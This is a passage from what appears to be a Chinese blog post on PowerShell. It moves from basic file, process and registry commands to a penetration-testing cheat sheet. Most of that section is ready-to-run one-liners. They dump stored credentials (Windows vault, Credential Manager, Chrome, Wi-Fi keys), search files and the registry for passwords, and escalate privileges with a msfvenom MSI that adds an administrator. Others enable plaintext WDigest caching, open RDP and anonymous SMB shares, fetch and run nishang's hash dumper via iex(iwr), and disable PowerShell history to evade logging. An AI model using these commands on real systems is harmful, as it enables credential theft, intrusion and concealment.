+  <figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Item</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">Cmder</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span><span class="hljs-operator">|</span><span class="hljs-built_in">Select</span><span class="hljs-operator">-</span><span class="hljs-variable">Object</span> <span class="hljs-operator">*</span><br></code></pre></td></tr></table></figure></li>
+<li><p>文件过滤：</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ChildItem</span>|<span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&#x27;\w*.md$&#x27;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.Length/<span class="hljs-number">1</span>kb <span class="hljs-operator">-gt</span> <span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>  Where-Object里面的$_是形式变量，代表每次迭代的文件。</p>
+</li>
+<li><p>轮询进程</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$process_name</span> = <span class="hljs-string">&#x27;svchost&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$true</span>)&#123;<br>    <span class="hljs-variable">$processes</span> = <span class="hljs-built_in">Get-Process</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$processes</span>.name <span class="hljs-operator">-contains</span> <span class="hljs-variable">$process_name</span>)<br>        <span class="hljs-built_in">Get-Process</span> <span class="hljs-variable">$process_name</span>|<span class="hljs-built_in">Stop-Process</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>  或者 <code>(Get-Process $process_name).kill()</code> 关也一样</p>
+</li>
+<li><p>编辑注册表</p>
+<p>  下面这个路径是一个安全的注册表路径，在这里修改注册表不会造成严重的系统问题。所以我们把它保存为一个变量。</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;HKCU:\Control Panel\Desktop&quot;</span><br></code></pre></td></tr></table></figure>
+<p>  如果要新建注册表项，可以使用New-Item命令。我们可以使用注册表编辑器regedit来验证项是否创建成功。</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> –Path <span class="hljs-variable">$path</span> –Name HelloKey<br></code></pre></td></tr></table></figure>
+<p>  如果要修改项的属性，使用Set-ItemProperty命令。</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-path</span> <span class="hljs-variable">$path</span>\hellokey <span class="hljs-literal">-name</span> Fake <span class="hljs-literal">-Value</span> fuck<br></code></pre></td></tr></table></figure>
+<p>  最后，如果要删除项的属性，使用Remove-ItemProperty命令。</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-ItemProperty</span> <span class="hljs-literal">-path</span> <span class="hljs-variable">$path</span>\hellokey <span class="hljs-literal">-name</span> Fake<br></code></pre></td></tr></table></figure>
+<p>  如果要删除整个注册表项，使用Remove-Item命令。</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-path</span> <span class="hljs-variable">$path</span>\hellokey <span class="hljs-literal">-Recurse</span><br></code></pre></td></tr></table></figure>
+<p>  未完待续。。。</p>
+</li>
+</ul>
+<hr>
+<h2 id="在渗透中的应用"><a href="#在渗透中的应用" class="headerlink" title="在渗透中的应用"></a>在渗透中的应用</h2><h3 id="敏感文件："><a href="#敏感文件：" class="headerlink" title="敏感文件："></a>敏感文件：</h3><ul>
+<li><p>识别敏感文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure></li>
+<li><p>从sysprep中或unattend中寻找文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure></li>
+<li><p>寻找包含 “密码”字符 的配置文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *.txt,*.xml,*.config,*.conf,*.cfg,*.ini <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>在配置文件中查找数据库凭证（例如web.config）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *.config,*.conf,*.xml <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;connectionString&quot;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>找到web服务器配置文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> web.config,applicationHost.config,php.ini,httpd.conf,httpd<span class="hljs-literal">-xampp</span>.conf,my.ini,my.cnf <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure>
+<h3 id="抓取凭证："><a href="#抓取凭证：" class="headerlink" title="抓取凭证："></a>抓取凭证：</h3></li>
+<li><p>从Windows PasswordVault获取存储的密码（web凭据）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">Windows.Security.Credentials.PasswordVault</span>,<span class="hljs-type">Windows.Security.Credentials</span>,<span class="hljs-type">ContentType</span>=<span class="hljs-type">WindowsRuntime</span>];(<span class="hljs-built_in">New-Object</span> Windows.Security.Credentials.PasswordVault).RetrieveAll() | % &#123; <span class="hljs-variable">$_</span>.RetrievePassword();<span class="hljs-variable">$_</span> &#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/img/article/typora-user-images%5Cimage-20210106115024800.png" srcset="/img/loading.gif" alt="image-20210106115024800"></p>
+</li>
+<li><p>从Windows凭据管理器获取存储的密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-StoredCredential</span> | % &#123; <span class="hljs-built_in">write-host</span> <span class="hljs-literal">-NoNewLine</span> <span class="hljs-variable">$_</span>.username; <span class="hljs-built_in">write-host</span> <span class="hljs-literal">-NoNewLine</span> <span class="hljs-string">&quot;:&quot;</span> ; <span class="hljs-variable">$p</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::SecureStringToBSTR(<span class="hljs-variable">$_</span>.password) ; [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAuto(<span class="hljs-variable">$p</span>); &#125;<br></code></pre></td></tr></table></figure></li>
+<li><p>从Google Chrome浏览器中转储密码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">System.Text.Encoding</span>]::UTF8.GetString([<span class="hljs-type">System.Security.Cryptography.ProtectedData</span>]::Unprotect(<span class="hljs-variable">$datarow</span>.password_value,<span class="hljs-variable">$null</span>,[<span class="hljs-type">System.Security.Cryptography.DataProtectionScope</span>]::CurrentUser))<br></code></pre></td></tr></table></figure></li>
+<li><p>从无线配置文件获取存储的Wi-Fi密码（admin）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(netsh wlan show profiles) | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;\:(.+)<span class="hljs-variable">$</span>&quot;</span> | %&#123;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_</span>.Matches.Groups[<span class="hljs-number">1</span>].Value.Trim(); <span class="hljs-variable">$_</span>&#125; | %&#123;(netsh wlan show profile name=<span class="hljs-string">&quot;<span class="hljs-variable">$name</span>&quot;</span> key=<span class="hljs-built_in">clear</span>)&#125;  | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;Key Content\W+\:(.+)<span class="hljs-variable">$</span>&quot;</span> | %&#123;<span class="hljs-variable">$pass</span>=<span class="hljs-variable">$_</span>.Matches.Groups[<span class="hljs-number">1</span>].Value.Trim(); <span class="hljs-variable">$_</span>&#125; | %&#123;[<span class="hljs-type">PSCustomObject</span>]<span class="hljs-selector-tag">@</span>&#123; PROFILE_NAME=<span class="hljs-variable">$name</span>;PASSWORD=<span class="hljs-variable">$pass</span> &#125;&#125; | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span><br></code></pre></td></tr></table></figure></li>
+<li><p>在注册表中搜索SNMP字符串</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> HKLM:\SYSTEM\CurrentControlSet\Services\SNMP <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure></li>
+<li><p>在注册表中搜索字符串模式</p>
+<ul>
+<li>以下PowerShell命令将筛选选定的注册表配置单元（HKCR，HKCU，HKLM，HKU和HKCC），并在注册表项名称或数据值中递归搜索任何选定的模式。在这种情况下，我们正在搜索“密码”模式：</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-variable">$hives</span> = <span class="hljs-string">&quot;HKEY_CLASSES_ROOT&quot;</span>,<span class="hljs-string">&quot;HKEY_CURRENT_USER&quot;</span>,<span class="hljs-string">&quot;HKEY_LOCAL_MACHINE&quot;</span>,<span class="hljs-string">&quot;HKEY_USERS&quot;</span>,<span class="hljs-string">&quot;HKEY_CURRENT_CONFIG&quot;</span><br><br><span class="hljs-comment"># Search in registry keys</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$r</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hives</span>) &#123; <span class="hljs-built_in">gci</span> <span class="hljs-string">&quot;registry::<span class="hljs-variable">$</span>&#123;r&#125;\&quot;</span> <span class="hljs-literal">-rec</span> <span class="hljs-literal">-ea</span> SilentlyContinue | <span class="hljs-built_in">sls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pattern</span>&quot;</span> &#125;<br><br><span class="hljs-comment"># Search in registry values</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$r</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hives</span>) &#123; <span class="hljs-built_in">gci</span> <span class="hljs-string">&quot;registry::<span class="hljs-variable">$</span>&#123;r&#125;\&quot;</span> <span class="hljs-literal">-rec</span> <span class="hljs-literal">-ea</span> SilentlyContinue | % &#123; <span class="hljs-keyword">if</span>((<span class="hljs-built_in">gp</span> <span class="hljs-variable">$_</span>.PsPath <span class="hljs-literal">-ea</span> SilentlyContinue) <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pattern</span>&quot;</span>) &#123; <span class="hljs-variable">$_</span>.PsPath; <span class="hljs-variable">$_</span> | <span class="hljs-built_in">out-string</span> <span class="hljs-literal">-stream</span> | <span class="hljs-built_in">sls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pattern</span>&quot;</span> &#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3></li>
+<li><p>搜索注册表以获取自动登录凭据（例如Credssp）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gp</span> <span class="hljs-string">&#x27;HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#x27;</span> | <span class="hljs-built_in">select</span> <span class="hljs-string">&quot;Default*&quot;</span><br></code></pre></td></tr></table></figure></li>
+<li><p>检查是否已启用AlwaysInstallElevated</p>
+<ul>
+<li>如果以下AlwaysInstallElevated注册表项设置为1，则意味着任何低特权用户都可以使用NT AUTHORITY \ SYSTEM特权安装* .msi文件.</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gp</span> <span class="hljs-string">&#x27;HKCU:\Software\Policies\Microsoft\Windows\Installer&#x27;</span> <span class="hljs-literal">-Name</span> AlwaysInstallElevated<br><span class="hljs-built_in">gp</span> <span class="hljs-string">&#x27;HKLM:\Software\Policies\Microsoft\Windows\Installer&#x27;</span> <span class="hljs-literal">-Name</span> AlwaysInstallElevated<br><br><span class="hljs-comment"># 可以使用msf生成msi安装包</span><br>msfvenom <span class="hljs-literal">-p</span> windows/exec CMD=<span class="hljs-string">&#x27;net localgroup administrators joe /add&#x27;</span> <span class="hljs-operator">-f</span> msi &gt; pkg.msi<br></code></pre></td></tr></table></figure></li>
+<li><p>查找未用引号包含的服务路径</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gwmi</span> <span class="hljs-literal">-class</span> Win32_Service <span class="hljs-literal">-Property</span> Name, DisplayName, PathName, StartMode | <span class="hljs-built_in">Where</span> &#123;<span class="hljs-variable">$_</span>.StartMode <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Auto&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.PathName <span class="hljs-operator">-notlike</span> <span class="hljs-string">&quot;C:\Windows*&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.PathName <span class="hljs-operator">-notlike</span> <span class="hljs-string">&#x27;&quot;*&#x27;</span>&#125; | <span class="hljs-built_in">select</span> PathName,DisplayName,Name<br></code></pre></td></tr></table></figure></li>
+<li><p>检查LSASS WDigest缓存（明文凭据）</p>
+<ul>
+<li>0位禁用，1为启用</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查询</span><br>(<span class="hljs-built_in">gp</span> registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential<br><br><span class="hljs-comment"># 启用（启用必须要重启才生效）</span><br><span class="hljs-built_in">sp</span> registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest <span class="hljs-literal">-name</span> UseLogonCredential <span class="hljs-literal">-value</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+<li><p>GPP</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Push-Location</span> \\example.com\sysvol<br><span class="hljs-built_in">gci</span> * <span class="hljs-literal">-Include</span> *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">select-string</span> password<br><span class="hljs-built_in">Pop-Location</span><br></code></pre></td></tr></table></figure>
+<h3 id="内部网络以及服务"><a href="#内部网络以及服务" class="headerlink" title="内部网络以及服务"></a>内部网络以及服务</h3></li>
+<li><p>启用RDP</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Allow RDP connections</span><br>(<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> <span class="hljs-string">&quot;Win32_TerminalServiceSetting&quot;</span> <span class="hljs-literal">-Namespace</span> root\cimv2\terminalservices).SetAllowTsConnections(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Disable NLA</span><br>(<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-class</span> <span class="hljs-string">&quot;Win32_TSGeneralSetting&quot;</span> <span class="hljs-literal">-Namespace</span> root\cimv2\terminalservices <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;</span>).SetUserAuthenticationRequired(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Allow RDP on the firewall</span><br><span class="hljs-built_in">Get-NetFirewallRule</span> <span class="hljs-literal">-DisplayGroup</span> <span class="hljs-string">&quot;Remote Desktop&quot;</span> | <span class="hljs-built_in">Set-NetFirewallRule</span> <span class="hljs-literal">-Enabled</span> True<br></code></pre></td></tr></table></figure></li>
+<li><p>创建smb匿名共享</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">new-item</span> <span class="hljs-string">&quot;c:\users\public\share&quot;</span> <span class="hljs-literal">-itemtype</span> directory<br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;sharedir&quot;</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;C:\users\public\share&quot;</span> <span class="hljs-literal">-FullAccess</span> <span class="hljs-string">&quot;Everyone&quot;</span>,<span class="hljs-string">&quot;Guests&quot;</span>,<span class="hljs-string">&quot;Anonymous Logon&quot;</span><br><br><span class="hljs-comment"># 停用</span><br><span class="hljs-built_in">Remove-SmbShare</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;sharedir&quot;</span> <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure></li>
+<li><p>将ip加入防火墙白名单</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;pentest&quot;</span> <span class="hljs-literal">-RemoteAddress</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">15.123</span><br><br><span class="hljs-comment"># 删除</span><br><span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;pentest&quot;</span><br></code></pre></td></tr></table></figure>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3></li>
+<li><p>无文件加载攻击模块</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span>(<span class="hljs-built_in">iwr</span>(<span class="hljs-string">&quot;https://URL&quot;</span>))<br><br><span class="hljs-comment"># e.g.</span><br><span class="hljs-built_in">iex</span>(<span class="hljs-built_in">iwr</span>(<span class="hljs-string">&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&quot;</span>));<span class="hljs-built_in">Get-PassHashes</span><br></code></pre></td></tr></table></figure></li>
+<li><p>获取域内sid</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">([<span class="hljs-type">System.Security.Principal.WindowsIdentity</span>]::GetCurrent()).User.Value<br></code></pre></td></tr></table></figure></li>
+<li><p>禁用PowerShell命令日志记录（很有用！！）</p>
+<ul>
+<li><p>默认情况下，PowerShell会自动在历史记录文件中记录多达4096个命令，就像Bash在Linux上一样。</p>
+<p>PowerShell历史记录文件是一个纯文本文件，位于每个用户的配置文件中的以下位置：</p>
+<ul>
+<li>C：\ Users \ &lt;用户名&gt; \ AppData \ Roaming \ Microsoft \ Windows \ PowerShell \ PSReadline \ ConsoleHost_history.txt</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-PSReadlineOption</span> –HistorySaveStyle SaveNothing<br><span class="hljs-comment"># or</span><br><span class="hljs-built_in">Remove-Module</span> PSReadline<br><br><span class="hljs-comment"># 注意：这条命令会在历史中记录</span><br></code></pre></td></tr></table></figure></li>
+<li><p>列出AV</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-CimInstance</span> <span class="hljs-literal">-Namespace</span> root/SecurityCenter2 <span class="hljs-literal">-ClassName</span> AntiVirusProduct<br></code></pre></td></tr></table></figure>
+<p><img src="/img/article/typora-user-images%5Cimage-20210106121645232.png" srcset="/img/loading.gif" alt="image-20210106121645232"></p>
+</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Language/">Language</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Language/">Language</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/03/%E6%9D%82%E6%96%874/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">杂文4</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/03/exchange/">
+                        <span class="hidden-mobile">excahnge在渗透中的利用</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
